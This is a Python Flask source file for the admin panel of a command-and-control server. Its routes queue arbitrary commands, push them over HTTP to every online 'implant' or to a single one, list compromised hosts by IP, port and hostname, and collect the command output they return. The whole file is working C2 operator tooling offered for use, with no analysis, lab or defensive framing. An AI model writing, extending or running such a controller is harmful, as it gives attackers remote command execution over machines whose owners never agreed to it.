import os
from flask import Blueprint, jsonify, request # type: ignore
import sqlite3, datetime, random, requests

admin_blueprint = Blueprint("admin", __name__, url_prefix="/admin")

def get_db_conn():
    conn = sqlite3.connect("c2.db")
    conn.row_factory = sqlite3.Row
    return conn


"""
Queue a new command for all implants
"""
@admin_blueprint.route("/broadcast-command", methods=["POST"])
def broadcast_command():
    data = request.get_json() or {}
    cmd  = data.get('cmd')
    if not cmd:
        return jsonify({"error":"Missing 'cmd'"}), 400

    now = datetime.datetime.now().isoformat()
    with get_db_conn() as conn:
        cur = conn.cursor()
        cur.execute(
            "INSERT INTO commands(command_text, sent_at) VALUES(?, ?)",
            (cmd, now)
        )
        cmd_id = cur.lastrowid

    with get_db_conn() as conn:
        conn.row_factory = sqlite3.Row
        cur = conn.cursor()
        cur.execute("""
            SELECT ip, port
              FROM implants
             WHERE strftime('%s','now') - strftime('%s', last_heartbeat) <= ?
             ORDER BY registered_at DESC
        """, (30,))
        peers = cur.fetchall()

    if not peers:
        return jsonify({"error":"No implants online"}), 503

    payload = {
      "id": cmd_id,
      "cmd": cmd,
      "target": "*"
    }

    errors = []
    for row in peers:
        ip, port = row['ip'], row['port']
        target   = f"http://{ip}:{port}/receive-command"
        try:
            r = requests.post(target, json=payload, timeout=30)
            r.raise_for_status()
        except Exception as e:
            errors.append(f"{ip}:{port} → {e}")

    if len(peers) > len(errors) > 0:
        return jsonify({
            "error":   "Failed to dispatch to some implants, but they will get it sooner or later through syncing, so no need to worry",
            "status": "error",
            "details": errors
        }), 502
    elif len(errors) == len(peers):
        return jsonify({
            "error":   "Failed to dispatch to any implant",
            "status": "error",
            "details": errors
        }), 502
    else:
        return jsonify({
            "status": "dispatched",
            "cmd_id": cmd_id
        }), 200


@admin_blueprint.route("/send-command", methods=["POST"])
def send_command():
    data      = request.get_json() or {}
    cmd       = data.get('cmd')
    target_id = data.get("target_id")

    if not cmd:
        return jsonify({"error":"Missing 'cmd'"}), 400
    if not target_id:
        return jsonify({"error":"Missing 'target_id'"}), 400
    
    with get_db_conn() as conn:
        conn.row_factory = sqlite3.Row
        cur = conn.cursor()
        cur.execute("""
            SELECT ip, port
              FROM implants
             WHERE id = ?
        """, (target_id,))
        implant = cur.fetchone()

    if not implant:
        return jsonify({"error":"Implant not found"}), 503

    now = datetime.datetime.now().isoformat()
    with get_db_conn() as conn:
        cur = conn.cursor()
        cur.execute(
            "INSERT INTO commands(command_text, sent_at, target) VALUES(?, ?, ?)",
            (cmd, now, "singular")
        )
        cmd_id = cur.lastrowid


    payload = {
      "id": cmd_id,
      "cmd": cmd,
      "target": "singular"
    }

    ip = implant["ip"]
    port = implant['port']

    errors = []
    target   = f"http://{ip}:{port}/receive-command"
    try:
        r = requests.post(target, json=payload, timeout=30)
        r.raise_for_status()
    except Exception as e:
        errors.append(f"{ip}:{port} → {e}")

    if len(errors) > 0:
        return jsonify({
            "error":   "Failed to dispatch to implant",
            "status": "error",
            "details": errors
        }), 502
    else:
        return jsonify({
            "status": "dispatched",
            "cmd_id": cmd_id
        }), 200


"""
List all the queued commands
"""
@admin_blueprint.route("/commands", methods=["GET"])
def list_commands():
    with get_db_conn() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT id, command_text, sent_at, status, target FROM commands ORDER BY sent_at DESC")
        rows = cursor.fetchall()

    cmds = [dict(r) for r in rows]
    # print(cmds)
    return jsonify({"cmds": cmds}), 200


@admin_blueprint.route("/online-implants", methods=["GET"])
def online_implants():
    with get_db_conn() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM implants")
        rows = cursor.fetchall()

    now = datetime.datetime.now()
    online_implants = []
    for implant in rows:
        id = implant["id"]
        ip = implant["ip"]
        port = implant["port"]
        hostname = implant["hostname"]
        last_heartbeat = implant["last_heartbeat"]
        registered_at = implant["registered_at"]

        try:
            heartbeat_time = datetime.datetime.fromisoformat(last_heartbeat)
            if (now - heartbeat_time).total_seconds() <= 35:
                online_implants.append({
                    "id": id,
                    "ip": ip,
                    "port": port,
                    "last_heartbeat": (now - heartbeat_time).total_seconds(),
                    "hostname": hostname,
                    "registered_at": registered_at
                })
        except Exception:
            continue

    # print(online_implants)
    return jsonify({
        "implants": online_implants
    }), 200


@admin_blueprint.route("/get-result", methods=["GET"])
def get_result():
    cmd_id = request.args.get("id")

    with get_db_conn() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT implant_id, output, received_at FROM results WHERE command_id = ?", (cmd_id,))
        rows = cursor.fetchall()
    
    result_arr = []
    for r in rows:
        implant_id = r["implant_id"]
        output = r["output"]
        received_at = r["received_at"]

        with get_db_conn() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT ip FROM implants WHERE id = ?", (implant_id,))
            implant = cursor.fetchone()
        
        implant_ip = implant["ip"]

        result_arr.append({
            "implant_ip": implant_ip,
            "implant_id": implant_id,
            "output": output,
            "received_at": received_at
        })
    # print(result_arr)
    return jsonify({
        "results": result_arr
    })